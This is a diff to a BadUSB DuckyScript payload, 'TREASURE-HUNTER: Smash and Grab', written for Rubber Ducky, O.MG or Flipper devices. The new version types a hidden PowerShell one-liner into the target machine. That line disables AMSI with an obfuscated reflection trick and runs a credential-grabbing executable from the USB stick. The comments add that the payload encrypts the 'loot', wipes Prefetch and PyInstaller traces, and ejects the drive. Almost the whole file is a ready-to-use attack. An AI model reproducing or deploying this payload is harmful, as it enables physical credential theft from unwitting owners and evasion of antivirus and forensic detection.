@@ -1,22 +1,23 @@
 REM ============================================================
-REM TREASURE-HUNTER: Smash and Grab
+REM TREASURE-HUNTER: Smash and Grab (USB)
 REM ============================================================
-REM Quick credential extraction to USB storage
+REM Plug in. Walk away. Pull out when LED stops / USB ejects.
+REM
+REM What happens:
+REM   1. Opens hidden PowerShell
+REM   2. Bypasses AMSI
+REM   3. Finds treasure-hunter.exe on USB
+REM   4. Runs smash scan (5 min) with all grabbers
+REM   5. Encrypts output to USB as loot.jsonl.enc
+REM   6. Cleans up Prefetch + PyInstaller traces
+REM   7. Ejects USB
+REM
+REM Prerequisites: treasure-hunter.exe on USB root
 REM Device: Hak5 Rubber Ducky / O.MG / Flipper BadUSB
-REM Duration: ~10s keystroke + 5min scan
-REM OPSEC: Console visible briefly, then minimized
 REM ============================================================
 
-REM Wait for USB enumeration
 DELAY 2000
-
-REM Open PowerShell (hidden window)
 GUI r
 DELAY 500
-STRING powershell -w minimized
-ENTER
-DELAY 1000
-
-REM Run treasure-hunter from USB drive, output to USB
-STRING $d=(Get-Volume | Where-Object {Test-Path "$($_.DriveLetter):\treasure-hunter.exe"}).DriveLetter; if($d){& "$d`:\treasure-hunter.exe" -p smash -o "$d`:\loot.jsonl" --encrypt --passphrase 'engagement-key-2024' -q; (New-Object -ComObject Shell.Application).NameSpace(17).ParseName("$d`:").InvokeVerb('Eject')}
+STRING powershell -w hidden -ep bypass -nop -c "$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');$f.SetValue($null,$true);$d=(Get-Volume|?{Test-Path \"$($_.DriveLetter):\treasure-hunter.exe\"}).DriveLetter;if($d){& \"$d`:\treasure-hunter.exe\" --auto --passphrase 'CHANGE-ME'}"
 ENTER
